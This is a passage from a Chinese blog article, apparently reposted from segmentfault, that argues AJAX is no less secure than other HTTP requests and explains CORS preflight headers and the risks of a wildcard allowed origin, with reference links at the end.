
<span class="hljs-number">2.</span> 数据中有一个字段 <span class="hljs-string">'name'</span>，后台接收到后没有进行过滤，直接如上面的演示一样，执行sql语句了

<span class="hljs-number">3.</span> 所以AJAX中如果给那个字段传入非法的注入信息，就会触发这个漏洞，导致攻击生效</code></pre>
<p>对，就是这样极端的情况下才会发生，而且与AJAX并没有关系，<strong>因为换成任何一种其它请求都会有类似的情况</strong>。。。</p>
<p>所以说，结论是：<strong>SQL注入与AJAX无关</strong></p>
<h2 id="articleHeader12">AJAX和HTTP请求的区别</h2>
<p>从本质上将：<strong>AJAX就是浏览器发出的HTTP请求</strong>，只不过是浏览器加上了一个同源策略限制而已。</p>
<p>AJAX请求的<code>XMLHTTPRequest</code>对象就是浏览器开放给JS调用HTTP请求用的。</p>
<p>那么AJAX和HTTP的区别呢？列出以下几点：</p>
<ul>
<li>AJAX请求受到浏览器的同源策略限制，存在跨域问题</li>
<li>AJAX在进行复杂请求时，浏览器会预先发出<code>OPTIONS</code>预检（HTTP自己是不会预检的）</li>
<li>从使用角度上说，AJAX使用简单一点，少了些底层细节，多了些浏览器特性（如自动带上同域cookie等）</li>
<li>所以说，和认证上的HTTP请求的区别就是-多了一次浏览器的封装而已（浏览器会有自己的预处理，加上特定限制）</li>
</ul>
<p>但是，从最终发出的报文来看，内容都是一样的（HTTP协议规范的内容），<strong>AJAX是发送HTTP请求的一种方式</strong></p>
<p>所以从这一点可以得出一个结论：<strong>AJAX本质上安全性和HTTP请求一样</strong></p>
<p><span class="img-wrap"><img data-src="/img/remote/1460000012693786?w=565&amp;h=493" src="https://static.alili.tech/img/remote/1460000012693786?w=565&amp;h=493" alt="" title="" style="cursor: pointer;"></span></p>
<h2 id="articleHeader13">CORS与AJAX安全性之间的关联</h2>
<p>按照前文中提到的内容，基本无法得出AJAX与请求不安全的关联。那么接下来，再继续分析，如果使用了跨域资源共享（CORS）后的安全性。<br>(因为往往ajax都会伴随着CORS)</p>
<h3 id="articleHeader14">CORS与AJAX关系的简介</h3>
<p>这是一个跨域共享方案，大致流程就是：（仅以复杂请求的预检举例-这一部分要求提前掌握CORS相关知识）</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="1. 前端AJAX请求前发出一个OPTIONS预检，会带一堆相关头部发送给服务端

2. 服务端在接受到预检时，检查头部，来源等信息是否合法，合法则接下来允许正常的请求，
否则直接无情的拒绝掉

3. 浏览器端如果收到服务端拒绝的信息（响应头部检查），就抛出对应错误。
否则就是正常的响应，接下来发出真正的请求（如POST）" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-number">1.</span> 前端AJAX请求前发出一个OPTIONS预检，会带一堆相关头部发送给服务端

<span class="hljs-number">2.</span> 服务端在接受到预检时，检查头部，来源等信息是否合法，合法则接下来允许正常的请求，
否则直接无情的拒绝掉

<span class="hljs-number">3.</span> 浏览器端如果收到服务端拒绝的信息（响应头部检查），就抛出对应错误。
否则就是正常的响应，接下来发出真正的请求（如POST）</code></pre>
<p>请求和响应的头部信息大概如下：</p>
<p><strong>Request Headers</strong></p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="// 在CORS中专门作为Origin信息供后端比对，表示来源域。
Origin: http://xxx
Access-Control-Request-Headers: X-Requested-With
// 所有用setRequestHeader方法设置的头部都将会以逗号隔开的形式包含在这个头中，一般POST请求中就会带上
Access-Control-Request-Method: OPTIONS" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-comment">// 在CORS中专门作为Origin信息供后端比对，表示来源域。</span>
Origin: http:<span class="hljs-comment">//xxx</span>
Access-Control-Request-Headers: X-Requested-With
<span class="hljs-comment">// 所有用setRequestHeader方法设置的头部都将会以逗号隔开的形式包含在这个头中，一般POST请求中就会带上</span>
Access-Control-Request-Method: OPTIONS</code></pre>
<p><strong>Response Headers</strong></p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Origin: http://xxx" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js">Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Origin: http:<span class="hljs-comment">//xxx</span></code></pre>
<p>最终，客户端发出的请求，必须符合服务端的校验规则才能正确，服务端才会返回正确头部，否则只会请求失败。报跨域错误。</p>
<p>以上仅是简介，更多信息可以参考来源中的<code>ajax跨域，这应该是最全的解决方案了</code></p>
<h3 id="articleHeader15">为什么要配置CORS？</h3>
<p>因为同源策略限制，AJAX无法请求跨域资源，CORS可以解决AJAX跨域请求问题。</p>
<p>因此：<strong>在本文中，配置CORS只是为了AJAX能跨域请求</strong></p>
<h3 id="articleHeader16">CORS会配置些什么信息？</h3>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Origin: http://xxx" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js">Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Origin: http:<span class="hljs-comment">//xxx</span></code></pre>
<p>如上，加上这个配置后，必须符合要求的才算是正常的请求，否则就会拒绝掉，一般AJAX跨域的话都会有OPTIONS，所以在预检中就做了这一步。</p>
<p>可以看到，关键的可变信息是：<code>Access-Control-Allow-Origin: http://xxx</code></p>
<p>这个配置就是域名白名单，规定在什么样的域名下才能进行AJAX跨域请求。</p>
<h3 id="articleHeader17">CORS <code>Origin: *</code>的安全性</h3>
<p>关键问题来了，在上面的CORS配置是这样的：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="Access-Control-Allow-Origin: http://xxx" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js" style="word-break: break-word; white-space: initial;">Access-Control-Allow-Origin: http:<span class="hljs-comment">//xxx</span></code></pre>
<p>但是这个配置只允许特定域名访问，鉴于前端的复杂性，有时候调试起来不是很方便，因此有时候，会偷懒的设置为：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="Access-Control-Allow-Origin: *" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js" style="word-break: break-word; white-space: initial;">Access-Control-Allow-Origin: *</code></pre>
<p>这个代表所有来源的跨域AJAX请求都能正常响应。</p>
<p>接下来我们再来分析设置<code>Origin: *</code>可能带来哪些问题。（都是基于AJAX的情况）</p>
<p><strong>问题1：会对cookie认证造成影响么？</strong></p>
<p>不会。虽然<code>*</code>代表了所有来源都能正常请求，但是同源策略下，是无法带上跨域cookie的。因此根本无法用身份验证。</p>
<p>而且，就算用<code>withCredentials</code>强行带上跨域cookie，因为后台没有支持，所以会报错。（这可以看成是CORSs模型的最后一道防线）</p>
<p>再者，后台就算配置<code>Access-Control-Allow-Credentials</code>允许跨域cookie，但是这时候的安全策略是<code>Origin</code>不允许为*，必须是一个明确的地址。<br>（否则你就可以看到浏览器的报错信息-跨域cookie时，Origin不允许为*）</p>
<p><strong>问题2：如果伪造Origin头部呢？</strong></p>
<p>首先，标准的浏览器中是不允许你伪造的（除非有严重漏洞），所以一般需要通过模拟客户端请求伪造。</p>
<p>但是。在非浏览器情况下，本来就没有同源策略。这又是何必。。。</p>
<p>所以说，伪造Origin与CORS并没有关系。</p>
<p><strong>问题3：如果后台本来就存在漏洞呢？</strong></p>
<p>做这样一个假设，假设用户所在网络的内网中有一台内网服务器，并且配置了允许所有的跨域请求：（当然，外网是请求不到内网的）</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="// 允许任何来自任意域的跨域请求
Access-Control-Allow-Origin: *" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-comment">// 允许任何来自任意域的跨域请求</span>
Access-Control-Allow-Origin: *</code></pre>
<p>再假设内网服务器上恰巧存在敏感资源，并且没有额外设防，只要内网就能访问。譬如：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="192.168.111.23/users.md" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js" style="word-break: break-word; white-space: initial;"><span class="hljs-number">192.168</span><span class="hljs-number">.111</span><span class="hljs-number">.23</span>/users.md</code></pre>
<p>然后用户访问了恶意网页，而像HTML之类的网页都是下载到本地执行的，<br>正好网页内有恶意代码，去向<code>192.168.111.23/users.md</code>请求资源，再将接收到的服务端返回发送到攻击者服务器。<br>（因为加了Origin为*，而且AJAX是由本地浏览器发出的，所以用户下载到本地的恶意网站是可以访问到用户内网中的后台的）</p>
<p>然后这些敏感数据就这样被盗取了。</p>
<p>But，这是因为服务端漏洞而存在的问题，设置Origin为<em>的后台上为何要放置敏感资源？正常设置为Origin为</em>的最大作用是用作公共API。<br>而且更重要的是，为何敏感资源就这样轻易的被获取了？为什么没有二次验证？</p>
<p>SO，后台本身有漏洞，所以才导致被攻击，AJAX恰好是攻击的手段之一（除了AJAX外还会有其它的方式），所以很多锅都甩到了AJAX头上。</p>
<p>这样，可以得出一个保守点的结论：</p>
<p><strong>Origin如果不是<code>*</code>，AJAX请求并不会有安全问题，如果是<code>*</code>，可能会由于后台的漏洞，不经意间，AJAX就被作为一种攻击手段了，导致了出现AJAX不安全的说法</strong></p>
<p><span class="img-wrap"><img data-src="/img/remote/1460000012693787?w=880&amp;h=476" src="https://static.alili.tech/img/remote/1460000012693787?w=880&amp;h=476" alt="" title="" style="cursor: pointer;"></span></p>
<h2 id="articleHeader18">再看，AJAX请求真的不安全么？</h2>
<p>仍然是最初的结论：</p>
<p><strong>如果某个Web应用具备良好的安全性，那么再怎么用“不安全的AJAX”也削弱不了它的安全性，反之如果应用本身存在漏洞，不管用何种技术请求，它都是不安全的</strong></p>
<p>我们可以看到，XSS也好，CSRF也好，以及其它隐藏的可能漏洞也好，本质上都是后台已有漏洞造成的问题，AJAX最多是被用作一种攻击手段（甚至某些里面AJAX还无法使用）</p>
<p>提到AJAX请求不安全的，譬如有CORS里面配置<code>Origin: *</code>造成某些极端情况下能通过AJAX发出攻击。但事实上这也是其中的一种攻击手段而已，没有AJAX，该不安全的仍然不安全。</p>
<p>譬如还有的说法是：因为在AJAX出现以前，如果出现安全漏洞，容易被察觉，但AJAX是异步的，更容易隐式的出现安全问题。。。这也与安全性的本质无关。</p>
<p>最重要一点，从Web应用安全角度来谈，Web应用必须从不信任客户端。所以不要再把锅甩给AJAX。</p>
<h2 id="articleHeader19">AJAX请求哪里不安全？</h2>
<p>同上，AJAX本身并不存在这种安全问题。</p>
<p>不过有一点需注意，如果使用了CORS方案。</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="1. Allow-Origin可以设置特定的值，过滤特定的白名单

2. 对于一些公共的API，可以直接将Allow-Origin设置为`*`

3. 当然，如果确认后台没有这些隐藏漏洞，可以直接使用`*`，毕竟也只是针对浏览器的同源策略而已，影响没有那么大。" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-number">1.</span> Allow-Origin可以设置特定的值，过滤特定的白名单

<span class="hljs-number">2.</span> 对于一些公共的API，可以直接将Allow-Origin设置为<span class="hljs-string">`*`</span>

<span class="hljs-number">3.</span> 当然，如果确认后台没有这些隐藏漏洞，可以直接使用<span class="hljs-string">`*`</span>，毕竟也只是针对浏览器的同源策略而已，影响没有那么大。</code></pre>
<h2 id="articleHeader20">怎么样让AJAX请求更安全？</h2>
<p>仍然是文中反复提到的结论：</p>
<p><strong>让Web后台更安全，则AJAX请求也更安全，反之后台有漏洞，不管怎么样都是不安全的</strong></p>
<h2 id="articleHeader21">写在最后的话</h2>
<p>这样的话，应该可以把AJAX不安全的锅甩掉了吧？</p>
<h2 id="articleHeader22">附录</h2>
<h3 id="articleHeader23">参考资料</h3>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" rel="nofollow noreferrer" target="_blank">跨站请求伪造</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" rel="nofollow noreferrer" target="_blank">跨站脚本</a></li>
<li><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" rel="nofollow noreferrer" target="_blank">浅谈CSRF攻击方式</a></li>
<li><a href="http://blog.csdn.net/ghsau/article/details/17027893" rel="nofollow noreferrer" target="_blank">XSS攻击及防御</a></li>
<li><a href="https://www.cnblogs.com/lovesong/p/5199623.html" rel="nofollow noreferrer" target="_blank">前端安全之XSS攻击</a></li>
<li><a href="http://blog.csdn.net/wei00d6ra/article/details/39137849" rel="nofollow noreferrer" target="_blank">AJAX真的不安全？</a></li>
<li><a href="https://segmentfault.com/q/1010000002500378/a-1020000002502912">AJAX 如何保证数据的安全性？</a></li>
<li><a href="http://blog.csdn.net/fengyinchao/article/details/50775121" rel="nofollow noreferrer" target="_blank">Web 开发常见安全问题</a></li>
<li><a href="http://blog.csdn.net/fengyinchao/article/details/50775121" rel="nofollow noreferrer" target="_blank">跨域资源共享(CORS)安全性浅析</a></li>
<li><a href="https://segmentfault.com/a/1190000012469713?_ea=3085755">ajax跨域，这应该是最全的解决方案了</a></li>
</ul>

                
{{< /raw >}}

# 版权声明
本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有，

本文仅用于学习、研究和交流目的。转载请注明出处、完整链接以及原作者。

原作者若认为本站侵犯了您的版权，请联系我们，我们会立即删除！

## 原文标题
AJAX请求真的不安全么？谈谈Web安全与AJAX的关系。

## 原文链接
[https://segmentfault.com/a/1190000012693772](https://segmentfault.com/a/1190000012693772)

